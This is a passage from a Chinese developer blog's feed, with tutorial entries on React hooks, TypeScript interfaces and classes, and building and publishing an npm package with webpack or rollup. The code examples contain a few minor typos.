title="useMemo"></a>useMemo</h3><p>缓存计算存值，仅当依赖项变化时更新，减少不必要的重新计算。不传入依赖则每次都会更新，传入空数组则只更新一次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function App() &#123;</span><br><span class="line">  const [count, setCount] = useState(1);</span><br><span class="line">  const [val, setValue] = useState(&apos;&apos;);</span><br><span class="line"></span><br><span class="line">  function getNum() &#123;</span><br><span class="line">    console.log(&apos;===getNum 函数执行了！===&apos;)</span><br><span class="line">    return Array.from(&#123; length: count * 100 &#125;, (v, i) =&gt; i).reduce((a, b) =&gt; a + b)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const memo = useMemo(getNum, [count]) // 返回的是最后的计算值, 依赖项如果传入的是空数组则永远不会重新计算。如果不指定第二个参数则每次刷新都会重新计算</span><br><span class="line"></span><br><span class="line">  return &lt;div&gt;</span><br><span class="line">    &lt;h4&gt;总和：&#123;memo&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/button&gt;</span><br><span class="line">      &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setValue(event.target.value)&#125; /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><h3 id="useCallback"><a href="#useCallback" class="headerlink" title="useCallback"></a>useCallback</h3><p>缓存函数，仅当依赖项变化时更新函数，当把返回的缓存函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function App() &#123;</span><br><span class="line">  const [count, setCount] = useState(1);</span><br><span class="line">  const [val, setValue] = useState(&apos;&apos;);</span><br><span class="line"></span><br><span class="line">  function computed() &#123;</span><br><span class="line">    console.log(&apos;===getNum===&apos;)</span><br><span class="line">    return Array.from(&#123; length: count * 100 &#125;, (v, i) =&gt; i).reduce((a, b) =&gt; a + b)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const getNum = useCallback(computed, [count]) // 返回函数</span><br><span class="line"></span><br><span class="line">  return &lt;div&gt;</span><br><span class="line">      &lt;Child getNum=&#123;getNum&#125; /&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">          &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/button&gt;</span><br><span class="line">          &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setValue(event.target.value)&#125;/&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const Child = React.memo(function (&#123; getNum &#125;) &#123;</span><br><span class="line">  return &lt;h4&gt;总和：&#123;getNum()&#125;&lt;/h4&gt;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><h3 id="useReducer"><a href="#useReducer" class="headerlink" title="useReducer"></a>useReducer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; useReducer &#125; from &apos;react&apos;;</span><br><span class="line">import Child from &apos;./child&apos;</span><br><span class="line">import &#123; MyContext &#125; from &apos;./context&apos;;</span><br><span class="line"></span><br><span class="line">function App() &#123;</span><br><span class="line">  // dispatch 是稳定的标识，每次更新不会被改变。</span><br><span class="line">  const [reduceNum, dispatch] = useReducer(reducer, &#123;num: 1&#125;)</span><br><span class="line"></span><br><span class="line">  function reducer(state, action) &#123;</span><br><span class="line">    switch (action.type) &#123;</span><br><span class="line">      case &apos;set999&apos;:</span><br><span class="line">        return &#123;num: 999&#125;;</span><br><span class="line">      case &apos;set666&apos;:</span><br><span class="line">        return &#123;num: 666&#125;;</span><br><span class="line">      default:</span><br><span class="line">        throw new Error();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;MyContext.Provider value=&#123;&#123; reduceNum, dispatch&#125;&#125;&gt;</span><br><span class="line">        &lt;Child&gt;&lt;/Child&gt;</span><br><span class="line">        &lt;div&gt;这里是父组件的reduceNum：&#123;reduceNum.num&#125;&lt;/div&gt;</span><br><span class="line">      &lt;/MyContext.Provider&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; useContext, useReducer &#125; from &apos;react&apos;;</span><br><span class="line">import &#123; MyContext &#125; from &apos;./context&apos;</span><br><span class="line"></span><br><span class="line">function Child2() &#123;</span><br><span class="line">  // 读取 MyContext.Provider 的 value 属性值。</span><br><span class="line">  // dispatch 为 useReducer 创建，避免了层层传递回调函数，且标识稳定</span><br><span class="line">  const &#123; dispatch, reduceNum &#125; = useContext(MyContext)</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; dispatch(&#123; type: &apos;set999&apos; &#125;)&#125;&gt;set999&lt;/button&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; dispatch(&#123; type: &apos;set666&apos; &#125;)&#125;&gt;set666&lt;/button&gt;</span><br><span class="line">      &lt;div&gt;这里是子组件的reduceNum：&#123;reduceNum.num&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default Child2;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; createContext &#125; from &apos;react&apos;;</span><br><span class="line"></span><br><span class="line">export const MyContext = createContext(&#123;</span><br><span class="line">  count: 111,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><h3 id="useLayoutEffect"><a href="#useLayoutEffect" class="headerlink" title="useLayoutEffect"></a>useLayoutEffect</h3><p>dom 更新之后调用。但会在浏览器绘制之前同步执行完 useLayoutEffect 内部的代码，因此会阻塞浏览器的渲染<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function Child() &#123;</span><br><span class="line">  const [n, setN] = useState(0)</span><br><span class="line"></span><br><span class="line">  useLayoutEffect(() =&gt; &#123;</span><br><span class="line">    var n = 10000;</span><br><span class="line">    while(n-- &gt; 0) &#123;</span><br><span class="line">      console.log(n)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; &#123;setN(n + 1)&#125;)&#125;&gt;点击&lt;/button&gt;</span><br><span class="line">      // while 循环结束后才会添加动画</span><br><span class="line">      &lt;div className=&#123;`container $&#123;n === 1 ? &apos;animate&apos; : &apos;&apos;&#125;`&#125;&gt;&#123;n&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><h3 id="hooks-中的闭包问题"><a href="#hooks-中的闭包问题" class="headerlink" title="hooks 中的闭包问题"></a>hooks 中的闭包问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function App() &#123;</span><br><span class="line">  const [count, setCount]  = useState(1)</span><br><span class="line"></span><br><span class="line">  // 闭包的bug</span><br><span class="line">  // 所意官方要求每次useEffect内部用到的遍历都要放在依赖项数组中，否则不是最新</span><br><span class="line">  useEffect(() =&gt; &#123;</span><br><span class="line">    setInterval(() =&gt; &#123;&apos;</span><br><span class="line">      // 每次获取到的都是初始值1</span><br><span class="line">      console.log(&apos;setInerval count:&apos;, count)</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">  &#125;, [])</span><br><span class="line"></span><br><span class="line">  const handleClick = () =&gt; &#123;</span><br><span class="line">    setCount(per =&gt; per + 1)</span><br><span class="line">    // count 值每次 +1</span><br><span class="line">    console.log(&apos;handleClick count:&apos;, count)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return(</span><br><span class="line">    &lt;button onClick=&#123;handleClick&#125;&gt;按钮&lt;/button&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="React-memo"><a href="#React-memo" class="headerlink" title="React.memo"></a>React.memo</h3><p>为高阶组件, 可接受 <strong>Component</strong> 组件和<strong>函数</strong>组件，这里注意两种都可使用！！！。返回值为 react 组件。所以适用于 prop 值简单的情况</p></blockquote><blockquote><h3 id="PureComponent"><a href="#PureComponent" class="headerlink" title="PureComponent"></a>PureComponent</h3><p>相当于在 shouldComponentUpdate() 中对 prop 和 state 进行了浅比较。所以适用于 prop 值简单的情况</p><ol><li>在 Component 组件。多次 setState 相同值时，每次都会渲染吗？在 pureComponent 中会有不同吗？<br>答：Component 多次 setState 相同值时仍然会调用到 render 函数。可在 shouldComponentUpdate 中优化。<br>pureComponent 多次 setState 相同值时<strong>不会</strong>调用 render 函数。</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;React&quot;&gt;&lt;a href=&quot;#React&quot; class=&quot;headerlink&quot; title=&quot;React&quot;&gt;&lt;/a&gt;React&lt;/h1&gt;&lt;h2 id=&quot;react-hooks&quot;&gt;&lt;a href=&quot;#react-hooks&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="React" scheme="https://fuzhongfeng.github.io/categories/React/"/>
    
    
      <category term="React" scheme="https://fuzhongfeng.github.io/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>Typescript</title>
    <link href="https://fuzhongfeng.github.io/2020/09/25/typescript/"/>
    <id>https://fuzhongfeng.github.io/2020/09/25/typescript/</id>
    <published>2020-09-25T08:33:56.000Z</published>
    <updated>2022-01-23T12:24:24.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript"></a>Typescript</h1><h2 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h2><ol><li>接口的作用就是为类型命名和为你的码定义契约</li><li><p>可选属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface SquareConfig &#123;</span><br><span class="line">  color?: string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>只读属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface Point &#123;</span><br><span class="line">    readonly x: number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>类类型，强制类去实现接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface ClockInterface &#123;</span><br><span class="line">    currentTime: Date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Clock implements ClockInterface &#123;</span><br><span class="line">    currentTime: Date;</span><br><span class="line">    constructor() &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>class 可以通过 implements 实现 interface, interface 只检查类里的公共属性，静态和私有属性都不会检查</p></li></ol><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ol><li>public修饰符，为默认值。</li><li><p>private 修饰符，不能在声明它的类的外部访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Animal &#123;</span><br><span class="line">    private name: string;</span><br><span class="line">    constructor(theName: string) &#123; this.name = theName; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Animal(&quot;Cat&quot;).name; // 错误: &apos;name&apos; 是私有的</span><br></pre></td></tr></table></figure></li><li><p>protected 修饰符，protected成员在派生类中仍然可以访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>readonly修饰符, 只读属性必须在声明时或构造函数里被初始化。</p></li><li>抽象类，抽象类做为其它派生类的基类使用。 它们一般不会直接被实例化。 不同于接口，抽象类可以包含成员的实现细节。 abstract关键字是用于定义抽象类和在抽象类内部定义抽象方法。</li></ol><h2 id="ts里-type-和-interface-的区别"><a href="#ts里-type-和-interface-的区别" class="headerlink" title="ts里 type 和 interface 的区别"></a>ts里 type 和 interface 的区别</h2><h3 id="相同点："><a href="#相同点：" class="headerlink" title="相同点："></a>相同点：</h3><ul><li>都可以被 class implements 实现</li><li>都可以描述一个对象或者函数</li><li>都允许拓展（extends），可以相互 extends<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// interface extents interface</span><br><span class="line">interface Name &#123; </span><br><span class="line">  name: string; </span><br><span class="line">&#125;</span><br><span class="line">interface User extends Name &#123; </span><br><span class="line">  age: number; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// type extends type</span><br><span class="line">type Name = &#123; </span><br><span class="line">  name: string; </span><br><span class="line">&#125;</span><br><span class="line">type User = Name &amp; &#123; age: number  &#125;;</span><br><span class="line"></span><br><span class="line">// interface extends type</span><br><span class="line">type Name = &#123; </span><br><span class="line">  name: string; </span><br><span class="line">&#125;</span><br><span class="line">interface User extends Name &#123; </span><br><span class="line">  age: number; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//  type extends interface</span><br><span class="line">interface Name &#123; </span><br><span class="line">  name: string; </span><br><span class="line">&#125;</span><br><span class="line">type User = Name &amp; &#123; </span><br><span class="line">  age: number; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><ul><li><p>type 可以声明基本类型别名，而interface不行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 基本类型别名</span><br><span class="line">type Name = string</span><br></pre></td></tr></table></figure></li><li><p>type 语句中还可以使用 typeof 获取实例的类型进行赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let div = document.createElement(&apos;div&apos;);</span><br><span class="line">type B = typeof div</span><br></pre></td></tr></table></figure></li><li><p>interface 可以声明合并，而type不行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">interface User &#123;</span><br><span class="line">  name: string</span><br><span class="line">  age: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface User &#123;</span><br><span class="line">  sex: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* User 接口为 &#123;</span><br><span class="line">  name: string</span><br><span class="line">  age: number</span><br><span class="line">  sex: string </span><br><span class="line">&#125;*/</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Typescript&quot;&gt;&lt;a href=&quot;#Typescript&quot; class=&quot;headerlink&quot; title=&quot;Typescript&quot;&gt;&lt;/a&gt;Typescript&lt;/h1&gt;&lt;h2 id=&quot;interface&quot;&gt;&lt;a href=&quot;#interface&quot; c
      
    
    </summary>
    
      <category term="Typescript" scheme="https://fuzhongfeng.github.io/categories/Typescript/"/>
    
    
      <category term="Typescript" scheme="https://fuzhongfeng.github.io/tags/Typescript/"/>
    
  </entry>
  
  <entry>
    <title>发布一个 npm 包</title>
    <link href="https://fuzhongfeng.github.io/2019/10/31/npm-publish/"/>
    <id>https://fuzhongfeng.github.io/2019/10/31/npm-publish/</id>
    <published>2019-10-31T03:41:50.000Z</published>
    <updated>2022-01-23T12:24:24.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="发布一个-npm-包"><a href="#发布一个-npm-包" class="headerlink" title="发布一个 npm 包"></a>发布一个 npm 包</h1><blockquote><p>最近在做项目的 SDK，需要将开发好的 SDK 包发布到 npm 私服上，其他项目使用时可以通过 npm install 安装并通过 import 语法引入使用。</p></blockquote><h2 id="webpack-打包-SDK（不推荐）"><a href="#webpack-打包-SDK（不推荐）" class="headerlink" title="webpack 打包 SDK（不推荐）"></a>webpack 打包 SDK（不推荐）</h2><blockquote><p>通过 script 脚本方式引入可以通过在 window 上添加属性并获取脚本内容，那么如果想通过 import、require 引入该如何打包呢？其实通过 webpack 配置来打包即可实现</p></blockquote><ol><li><p>将所有需要导出的模块引入到一个文件中并导出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// ./src/index.ts 文件</span><br><span class="line">import EditorSDK from &apos;./editor/index&apos;</span><br><span class="line">import PlayerSDK from &apos;./player/index&apos;</span><br><span class="line"></span><br><span class="line">export default &#123; EditorSDK, PlayerSDK &#125;</span><br></pre></td></tr></table></figure></li><li><p>配置 entry 和 output.libraryTarget 选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">    entry: &apos;./src/index.ts&apos;, // 项目的入口文件</span><br><span class="line">    output: &#123;</span><br><span class="line">        library: &apos;MyLibrary&apos;,</span><br><span class="line">        libraryTarget: &apos;umd&apos;,</span><br><span class="line">        globalObject: &apos;this&apos;, // node 和 浏览器都能获取到</span><br><span class="line">        libraryExport: &quot;default&quot;, // 将模块的default默认暴露，如果不指定自参数则需要获取window.MyLibrary.default（对应上文 export default），指定后window.MyLibrary即可获取到。</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>将模块包通过所有模块化方式暴露，因此可通过 CommonJS、AMD、ES2015 规范或作为全局变量使用。打包后的输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(function webpackUniversalModuleDefinition(root, factory) &#123;</span><br><span class="line">  if(typeof exports === &apos;object&apos; &amp;&amp; typeof module === &apos;object&apos;)</span><br><span class="line">    module.exports = factory();</span><br><span class="line">  else if(typeof define === &apos;function&apos; &amp;&amp; define.amd)</span><br><span class="line">    define([], factory);</span><br><span class="line">  else if(typeof exports === &apos;object&apos;)</span><br><span class="line">    exports[&apos;MyLibrary&apos;] = factory();</span><br><span class="line">  else</span><br><span class="line">    root[&apos;MyLibrary&apos;] = factory();</span><br><span class="line">&#125;)(typeof self !== &apos;undefined&apos; ? self : this, function() &#123;</span><br><span class="line">  return _entry_return_;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>配置 externals 选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 此选项可以将库中依赖的第三方不包含在打包生成的 bundle 文件中，从而减小发布包的体积</span><br><span class="line">module.exports = &#123;</span><br><span class="line">  externals: &apos;events&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="rollup-打包（推荐）"><a href="#rollup-打包（推荐）" class="headerlink" title="rollup 打包（推荐）"></a>rollup 打包（推荐）</h2><p>rollup 对于 tree-shaking 支持较好，一些前端流行都是用 rollup 打包，下面罗列一些开发中遇到的点：</p><ol><li>rollup 支持 umd 和 es 两种打包方式分别对应 package.json 中的 main 和 module 字段，直接 import 时会使用 es 文件对 tree-shaking 执行更好。</li><li>d.ts 声明文件如何生成？<br>可以通 tsconfig.json 中的 compilerOptions.declarationDir 字段指定文件夹目录如：dist/types。<br>通过 rollup-plugin-typescript2 插件生成，通过配置 useTsconfigDeclarationDir: true 读取。<br>注意如果使用了rollup-plugin-typescript2不指定声明文件目录也会生成声明文件但目录结构比较混乱。</li><li>external 排除引用的第三方包减少当前包的体积。<br>建议规范使用 package.json 字段，dependencies 字段中添加生产环境必须的依赖包，这样安装当前包的时候也会将 dependencies 内需要的包添加到使用的项目内。此选项建议直接读取 package.json dependencies。</li><li>为什么 rollup 对 tree-shaking 支持更好？<br>因为rollup基于显式的 import 和 export 语句的方式解析（不需要第三方 babel）。比在编译后的输出代码中，简单地运行自动 minifier 检测未使用的变量更有效（个人理解是webpack只会检测babel处理后的代码）。</li><li>rollup 不需要 babel 编译新特性代码，自身就可以处理。（官网：Rollup itself processes the config file, which is why we’re able to use export default syntax – the code isn’t being transpiled with Babel or anything similar, so you can only use ES2015 features that are supported in the version of Node.js that you’re running）。有利于 tree-shaking</li></ol><h2 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h2><ul><li>version 版本号发布时不能与已有的重复。</li><li>dependencies 和 devDependencies<br>一直说开发环境的包要放到 devDependencies 中、生产环境的把放到 dependencies。但即使混淆也并不影响项目打包，对于平时开发似乎没什么影响。但作为包发布却有很大的差别，<strong>dependencies 里的依赖用 npm 安装的时候会自动添加到 node_modules 中，webpack externals 或 roolup external 中配置后可不打包在 bundle 中，减小包的体积。</strong></li><li>peerDependencies<br><strong>字段指定的包在npm install 时不会在自动安装到当前宿主环境。</strong></li></ul><h2 id="2-npm-publish-发布"><a href="#2-npm-publish-发布" class="headerlink" title="2. npm publish 发布"></a>2. npm publish 发布</h2><blockquote><p>通过 npm publish 发布时只需要将编译过的 dist 目录发布即可。此时可配置 package.json 下的 files 字段。（此时只会将 dist 文件夹以及根目录下的 README.md 发布）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;fuzhongfeng-test-slide-sdk&quot;, // npm 包的名称，install 时使用</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;, // 每次 npm publish 时需要与线上的版本号不同才能发布</span><br><span class="line">  &quot;description&quot;: &quot;slide-sdk publish&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;/dist/bundle.js&quot;, // 指定模块ID为程序的主入口。如果包的名称为 foo 并且用户安装了此包，然后又执行 require（&quot;foo&quot;)，则返回主模块所导出的对象。</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;files&quot;: [&quot;dist&quot;], // 指定需要发布的文件夹目录，这样不会将开发代码也发布上去</span><br><span class="line">  &quot;typings&quot;: &quot;dist/index.d.ts&apos;, // 指定 ts 项目的申明文件</span><br><span class="line">  &quot;keywords&quot;: [],</span><br><span class="line">  &quot;author&quot;: &quot;&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><ul><li><p>根目录下执行 <code>npm publish</code> 发布</p></li><li><p>在其他项目中执行 <code>npm install -i fuzhongfeng-test-slide-sdk</code> 安装模块，并可通过 import、require 方式引入</p></li></ul><p>本文参考：<a href="https://webpack.js.org/guides/author-libraries/" target="_blank" rel="noopener">https://webpack.js.org/guides/author-libraries/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;发布一个-npm-包&quot;&gt;&lt;a href=&quot;#发布一个-npm-包&quot; class=&quot;headerlink&quot; title=&quot;发布一个 npm 包&quot;&gt;&lt;/a&gt;发布一个 npm 包&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;最近在做项目的 SDK，需要将开发好的 SDK 包
      
    
    </summary>
    
      <category term="npm" scheme="https://fuzhongfeng.github.io/categories/npm/"/>
    
    
      <category term="npm" scheme="https://fuzhongfeng.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>npm 私服搭建</title>
    <link href="https://fuzhongfeng.github.io/2019/10/24/npm-private/"/>
    <id>https://fuzhongfeng.github.io/2019/10/24/npm-private/</id>
    <published>2019-10-24T08:40:20.000Z</published>
    <updated>2022-01-23T12:24:24.011Z</updated>
    
